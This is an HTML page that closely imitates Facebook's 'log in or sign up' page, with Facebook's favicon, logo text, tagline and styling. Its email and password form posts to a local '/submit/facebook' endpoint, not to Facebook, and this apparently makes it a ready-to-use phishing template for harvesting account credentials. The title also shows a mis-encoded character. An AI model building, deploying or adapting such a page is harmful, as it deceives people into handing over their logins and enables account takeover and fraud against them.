<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook â€“ log in or sign up</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Helvetica, Arial, sans-serif;
            background: linear-gradient(white, #D3D8E8);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .main-container {
            width: 100%;
            max-width: 980px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 40px;
        }
        
        .left-side {
            flex: 1;
            max-width: 500px;
        }
        
        .facebook-logo {
            font-size: 56px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 16px;
            font-family: Klavika, sans-serif;
        }
        
        .tagline {
            font-size: 28px;
            font-weight: normal;
            color: #1c1e21;
            line-height: 32px;
            width: 500px;
        }
        
        .right-side {
            flex: 0 0 396px;
        }
        
        .login-card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
            width: 396px;
        }
        
        .input-field {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            margin-bottom: 12px;
            box-sizing: border-box;
            background: #f5f6f7;
        }
        
        .input-field:focus {
            outline: none;
            border-color: #1877f2;
            background: white;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        
        .login-btn {
            width: 100%;
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            padding: 12px;
            cursor: pointer;
            margin-bottom: 16px;
            transition: background-color 0.2s;
        }
        
        .login-btn:hover {
            background: #166fe5;
        }
        
        .forgot-password {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        
        .forgot-password a:hover {
            text-decoration: underline;
        }
        
        .divider {
            text-align: center;
            margin: 20px 0;
            position: relative;
        }
        
        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #dadde1;
        }
        
        .divider span {
            background: white;
            padding: 0 20px;
            color: #65676b;
            font-size: 14px;
        }
        
        .create-account-btn {
            background: #42b72a;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            font-weight: bold;
            padding: 12px 16px;
            cursor: pointer;
            margin: 0 auto;
            display: block;
            transition: background-color 0.2s;
        }
        
        .create-account-btn:hover {
            background: #36a420;
        }
        
        .footer-text {
            text-align: center;
            margin-top: 28px;
            font-size: 14px;
            color: #1c1e21;
        }
        
        .footer-text a {
            color: #1c1e21;
            text-decoration: none;
            font-weight: 600;
        }
        
        .footer-text a:hover {
            text-decoration: underline;
        }
        
        /* Mobile responsiveness */
        @media (max-width: 898px) {
            .main-container {
                flex-direction: column;
                text-align: center;
                gap: 20px;
            }
            
            .left-side {
                max-width: 396px;
            }
            
            .facebook-logo {
                font-size: 40px;
            }
            
            .tagline {
                font-size: 20px;
                line-height: 24px;
                width: auto;
            }
            
            .login-card {
                width: 100%;
                max-width: 396px;
            }
        }
        
        @media (max-width: 450px) {
            body {
                padding: 10px;
                background: #f0f2f5;
            }
            
            .main-container {
                gap: 10px;
            }
            
            .facebook-logo {
                font-size: 32px;
                margin-bottom: 10px;
            }
            
            .tagline {
                font-size: 16px;
                line-height: 20px;
                margin-bottom: 20px;
            }
            
            .login-card {
                padding: 16px;
                box-shadow: none;
                border: 1px solid #dddfe2;
            }
            
            .input-field {
                font-size: 16px; /* Prevent zoom on iOS */
                padding: 16px;
                margin-bottom: 8px;
            }
            
            .login-btn {
                font-size: 18px;
                padding: 14px;
            }
            
            .create-account-btn {
                font-size: 16px;
                padding: 14px 20px;
            }
            
            .footer-text {
                font-size: 12px;
                margin-top: 20px;
            }
        }
        
        @media (max-width: 320px) {
            .login-card {
                padding: 12px;
            }
            
            .facebook-logo {
                font-size: 28px;
            }
            
            .tagline {
                font-size: 14px;
            }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="left-side">
            <div class="facebook-logo">facebook</div>
            <div class="tagline">Connect with friends and the world around you on Facebook.</div>
        </div>
        
        <div class="right-side">
            <div class="login-card">
                <form action="/submit/facebook" method="post">
                    <input type="email" name="username" class="input-field" placeholder="Email or phone number" required>
                    <input type="password" name="password" class="input-field" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
                
                <div class="divider">
                    <span>or</span>
                </div>
                
                <button class="create-account-btn">Create new account</button>
            </div>
            
            <div class="footer-text">
                <a href="#">Create a Page</a> for a celebrity, brand or business.
            </div>
        </div>
    </div>
</body>
</html>
